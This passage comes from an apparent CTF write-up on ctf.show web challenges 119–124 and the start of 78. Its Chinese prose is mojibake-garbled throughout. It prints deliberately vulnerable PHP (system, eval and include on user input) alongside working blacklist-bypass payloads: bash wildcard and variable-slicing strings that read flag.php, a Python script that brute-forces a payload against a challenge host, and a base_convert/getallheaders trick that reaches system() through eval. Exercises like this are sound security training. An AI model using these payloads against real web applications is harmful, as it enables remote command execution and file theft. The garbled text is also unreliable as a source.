ËøõÁ®ãÂÆû‰æãÂµåÂ•óÊ∑±Â∫¶ÁöÑÁ¥ØÂä†Âô®,ËøõÁ®ãÁ¨¨‰∏ÄÊ¨°ÊâìÂºÄshellÊó∂${SHLVL}=1ÔºåÁÑ∂ÂêéÂú®Ê≠§shell‰∏≠ÂÜçÊâìÂºÄ‰∏Ä‰∏™shellÊó∂$SHLVL=2„ÄÇ</p></blockquote><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/PD59VJBEX0%294%5DVX%4082PHKLD.png" alt=""><br>‰∏ÄËà¨ÁªôÁöÑÊùÉÈôêÈÉΩÊòØwww-dataÔºåÊâÄ‰ª•Êàë‰ª¨Áî®<code>$&#123;USER&#125;</code>ÂèØ‰ª•Ëé∑Âæó‚Äúwww-data‚ÄùÔºåËÄåÊàë‰ª¨Ë¶ÅÂèñÂà∞atÁöÑËØùÈúÄË¶Å<code>$&#123;USER:~2:2&#125;</code>Ôºå‰ΩÜÊï∞Â≠óÊòØË¢´Á¶Å‰∫ÜÔºåÊâÄ‰ª•Êé•‰∏ãÊù•Êàë‰ª¨ËøòÈúÄË¶ÅÊÉ≥ÊÉ≥ÊÄé‰πàÊûÑÈÄ†Âá∫2ÔºåÁøª‰∫ÜÁøªÔºåËøôË¶Å‰ªÄ‰πàÊù•‰ªÄ‰πà‰∫ÜÔºåÁúãËßÅphpÁöÑÁâàÊú¨ÊòØ7.3.22ÔºåÊ≠£Â•ΩÂåÖÂê´Êï∞Â≠ó2ÔºåÊâÄ‰ª•Âà©Áî®<code>PHP_VERSION</code><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/3%60%40_Y1%241%5DVGXB1YAX_O%40YZL.png" alt=""><br>ÊâÄ‰ª•ÊÄùË∑ØÂæàÊ∏ÖÊô∞‰∫ÜÔºåÊûÑÈÄ†payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><p>ÂõûËΩ¶ÂêéÂè≥ÈîÆÊ∫êÁ†ÅÁúãÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/~V_%29Z5%7D%284%247%401WZ%5BKKT_KPC.png" alt=""></p><h3 id="web120"><a class="header-anchor" href="#web120">¬∂</a>web120</h3><p>ËøôÊ¨°ÂèòÊàêÊ∫êÁ†Å‰∫Ü</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÈôêÂà∂payloadÈïøÂ∫¶Âú®65‰ª•ÂÜÖÔºå‰∏äÈ¢òÊàë‰ª¨payloadËææÂà∞99ÁöÑÈïøÂ∫¶ÔºåÊâÄ‰ª•Êàë‰ª¨ÈÄÇÂΩìÂáèÂ∞ë‰∏Ä‰∏ãÔºåÊàë‰ª¨Â∞±‰∏çÂèñwww-data‰∏≠ÁöÑatÔºåÂè™ÂèñaËøõË°åÂåπÈÖçÔºåÂ•ΩÂÆ∂‰ºôÈÇ£Êàë‰∏äÈ¢òËøòÊÉ≥ÂçäÂ§©ÊûÑÈÄ†Êï∞Â≠ó2(Â§™Ëèú‰∫Ü)ÔºåÂ∞ùËØïÊûÑÈÄ†Â¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line"></span><br><span class="line">‰ΩÜÂèëÁé∞ÈïøÂ∫¶ÊòØ66ËøòÊòØË∂Ö‰∫ÜÔºåÊé•ÁùÄÊàë‰ª¨Êää$&#123;#&#125;ÂéªÊéâÔºå‰πüÊòØÂèØ‰ª•ÁöÑÔºåÊúÄÁªàpayloadÂ¶Ç‰∏ãÔºö</span><br><span class="line"></span><br><span class="line">code&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><p>Âè≥ÈîÆÊ∫êÁ†ÅÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web120/%5D%400%402N%25U%28%242%29DRO2%7BW%29ELWU.png" alt=""></p><h3 id="web121"><a class="header-anchor" href="#web121">¬∂</a>web121</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääUSERÁªôÁ¶Å‰∫ÜÔºåÈ¶ñÂÖàÊàë‰ª¨Áé∞Âú®ÂèØ‰ª•Âà©Áî®ÁöÑÊòØPWDÔºå‰πüÂ∞±ÊòØ‚Äú/var/www/html‚ÄùÔºåÂØπÂ∫î‰∫Ü‰∏Ä‰∏ãbin‰∏≠ÁöÑÂëΩ‰ª§ÔºåÂèëÁé∞Êàë‰ª¨ÂèØ‰ª•ÂèñrÊù•ÊûÑÈÄ†<code>/bin/rev</code>ÂèñÂèçÂëΩ‰ª§ËØªÂèñÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÊûÑÈÄ†Âá∫<code>$&#123;PWD:3:1&#125;</code>ÁöÑÊïàÊûú</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ËøôÈáåÊàë‰ª¨ÂèØ‰ª•Áî®$&#123;IFS&#125;Âíå$&#123;#&#125;ÂàÜÂà´Êõø‰ª£</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;Âú®ubuntuÁ≠âÁ≥ªÁªü‰∏≠ÂÄº‰∏∫3ÔºåÊàëÂú®kali‰∏≠ÊµãËØïÂÄº‰∏∫4</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;‰∏∫Ê∑ªÂä†Âà∞shellÁöÑÂèÇÊï∞‰∏™Êï∞Ôºå$&#123;##&#125;Âàô‰∏∫ÂÄº</span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•ÊûÑÊàêpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/%28Q6E%60%5BJ3U4RPV9O%29RWZA%60NV.png" alt=""><br>Êé•ÁùÄÂéªkaliÈáåÈù¢ÂÜçÂèñÂèç‰∏ÄÊ¨°Âç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/R%60WY22FV%40%25ZUY5%5BSK%7BRT%25%7DH.png" alt=""></p><h3 id="web122"><a class="header-anchor" href="#web122">¬∂</a>web122</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Êää<code>PWD</code>Âíå<code>#</code>ÈÉΩÁªôÁ¶Å‰∫Üüò¢ÔºåËøôÊ¨°Êàë‰ª¨Êç¢Âè¶‰∏Ä‰∏™ÂëΩ‰ª§<code>/bin/base64</code>ÔºåËøôÊ¨°ÊîæÂºÄ‰∫ÜHOMEÔºåÊàë‰ª¨Â∞±Áî®HOMEÊù•Ëé∑Âèñ<code>/</code>ÔºåÊï∞Â≠ó1ÁöÑËØùÊàë‰ª¨Ê≤°Ê≥ï‰ΩøÁî®<code>$&#123;##&#125;</code>‰∫ÜÔºåËøôÈáå‰ΩøÁî®<code>$?</code></p><blockquote><p><code>$?</code> ÊúÄÂêéËøêË°åÁöÑÂëΩ‰ª§ÁöÑÁªìÊùü‰ª£Á†ÅÔºàËøîÂõûÂÄºÔºâÂç≥ÊâßË°å‰∏ä‰∏Ä‰∏™Êåá‰ª§ÁöÑËøîÂõûÂÄº (ÊòæÁ§∫ÊúÄÂêéÂëΩ‰ª§ÁöÑÈÄÄÂá∫Áä∂ÊÄÅ„ÄÇ0Ë°®Á§∫Ê≤°ÊúâÈîôËØØÔºåÂÖ∂‰ªñ‰ªª‰ΩïÂÄºË°®ÊòéÊúâÈîôËØØ)</p></blockquote><p>ËøôÈáåÊâæ‰∫ÜÂá†‰∏™Êä•ÈîôËµÑÊñôÂíåÂØπÂ∫îÁöÑÂÄº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input&#x2F;output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure><p>Âà©Áî®<code>&lt;A</code>ÁöÑÊä•ÈîôÂ∞±ËÉΩËøîÂõûÂÄº1ÔºåÊ†πÊçÆÈ¢òÁõÆfuzzÊèêÁ§∫ÔºåÂêéÈù¢ÁöÑbase64‰∏≠ÁöÑ4Êàë‰ª¨ÂèØ‰ª•Âà©Áî®<code>$&#123;RANDOM&#125;</code>Êù•Ëé∑Âæó(Âõ†‰∏∫ÂÖ∑ÊúâÈöèÊú∫ÊÄßÔºåÊâÄ‰ª•Ë¶ÅÂ§öÂ∞ùËØïÁõ¥Âà∞ÈöèÊú∫Âá∫4Êù•)ÔºåÂà∞ËøôÈáåÊÄùË∑ØÂæàÊ∏ÖÊô∞‰∫ÜÔºåÊûÑÈÄ†paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>ÂÜô‰∏™ËÑöÊú¨Êù•Ë∑ë</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/19 12:17</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3f405f9a-8ca5-4519-aef8-95943df5d5de.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(result.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web122/D%40_HYTR%28%5B9%7D6%29KJBT45VBDF.png" alt=""><br>ÂÜçËøõË°åbase64Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web124"><a class="header-anchor" href="#web124">¬∂</a>web124</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//‰æãÂ≠ê c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Â§™Èïø‰∫Ü‰∏ç‰ºöÁÆó&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ËØ∑‰∏çË¶ÅËæìÂÖ•Â•áÂ•áÊÄ™ÊÄ™ÁöÑÂ≠óÁ¨¶&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Â∏∏Áî®Êï∞Â≠¶ÂáΩÊï∞http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ËØ∑‰∏çË¶ÅËæìÂÖ•Â•áÂ•áÊÄ™ÊÄ™ÁöÑÂáΩÊï∞&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Â∏Æ‰Ω†ÁÆóÂá∫Á≠îÊ°à</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂàÜÊûê‰∏ÄÊ≥¢Ê∫êÁ†ÅÔºåget‰º†ÂèÇcÔºåÂπ∂‰∏îÈïøÂ∫¶‰∏çËÉΩË∂ÖËøá80ÔºåËÆæÁΩÆ‰∫ÜÈªëÂêçÂçïÂíåÁôΩÂêçÂçïÂíåÊ≠£ÂàôËøáÊª§„ÄÇÊåâÁÖßÊèêÁ§∫Êàë‰ª¨ÂéªÊâæÊâæ‰∏Ä‰∫õÊï∞Â≠¶ÂáΩÊï∞ËøõË°å‰ΩøÁî®ÔºåËøô‰πàÂ§öÁôΩÂêçÂçï‰πüÊ≥®ÂÆö‰∫ÜÊúâÂ§öÁßçpayloadÔºåËøôÈáåÊàë‰ΩøÁî®<code>base_convert()</code>Âíå<code>getallheaders</code>ÈÖçÂêà‰ΩøÁî®<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/RJK%29FW%25W%5DI%7D7HR%5DPECDK0HP.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/EPWLSILUL%6048%40%24PDH%259AEAN.png" alt=""><br>Ê≥®ÊÑèÔºåÂõ†‰∏∫Ê≠£Âàô‰ºöÂåπÈÖçÂ≠óÊØçÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÈÄöËøá<code>base_convert()</code>ËøõË°å‰∏Ä‰∏™ËΩ¨Êç¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//ÂæóÂà∞1751504350Ôºå‰ªé36ËøõÂà∂ËΩ¨Êç¢Âà∞10ËøõÂà∂Ôºå36ËøõÂà∂ÂåÖÂê´10‰∏™Êï∞Â≠óÂíå26‰∏™Â≠óÊØç</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base_convert(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//ÂæóÂà∞8768397090111664438ÔºåËøôÈáå‰∏ç‰ΩøÁî®36ËøõÂà∂ÊòØÂõ†‰∏∫Á≤æÂ∫¶‰ºö‰∏¢Â§±ÔºåÂ∞ùËØïÂà∞30ÁöÑÊó∂ÂÄôÊàêÂäü</span></span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•ÊûÑÈÄ†payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) </span><br></pre></td></tr></table></figure><p>ËøôÈáåÁî®‰∏Ä‰∏™ÂèòÈáèÊù•Áº©Â∞èpayloadÈïøÂ∫¶Ôºå‰ΩÜÊ≥®ÊÑèÂèòÈáèÂêçË¶ÅÂèñÁôΩÂêçÂçï‰∏≠ÁöÑÂêçÂ≠óËøõË°åÂëΩÂêçÔºåÂê¶Âàô‰ºöË¢´ban<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/T%29W51CB%29N5TQ4%5B66Y8EECDJ.png" alt=""><br>ÊàêÂäüËé∑Âæóflag</p><h2 id="Êñá‰ª∂ÂåÖÂê´-78-88-116-117"><a class="header-anchor" href="#Êñá‰ª∂ÂåÖÂê´-78-88-116-117">¬∂</a>Êñá‰ª∂ÂåÖÂê´(78-88&amp;116-117)</h2><h3 id="web78"><a class="header-anchor" href="#web78">¬∂</a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span 